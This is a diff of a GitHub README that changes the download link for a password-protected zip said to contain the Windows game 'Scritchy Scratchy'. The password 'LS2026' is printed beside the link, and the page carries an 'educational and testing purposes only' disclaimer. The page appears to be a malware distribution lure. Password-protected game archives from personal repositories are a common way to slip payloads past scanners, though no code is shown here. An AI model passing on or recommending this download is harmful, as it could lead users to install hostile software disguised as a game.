@@ -23,7 +23,7 @@ This repository is for educational and testing purposes only. All files are prov
 ## 📥 Download
 Password-protected archive with the complete Windows package – extract and start scratching right away.
 
-📥 [Download `Scritchy-Scratchy-v1.0.18.zip`](https://github.com/ridhoaw02/Scritchy-Scratchy-Game-Windows/releases/download/Game/Scritchy-Scratchy-v1.0.18.zip)  
+📥 [Download `Scritchy-Scratchy-v1.0.18.zip`](https://github.com/ridhoaw02/Scritchy-Scratchy-Game-Windows/releases/download/Game/Scritchy-Scratchy.zip)  
 🔐 `LS2026`
 -
 ### Archive Contents
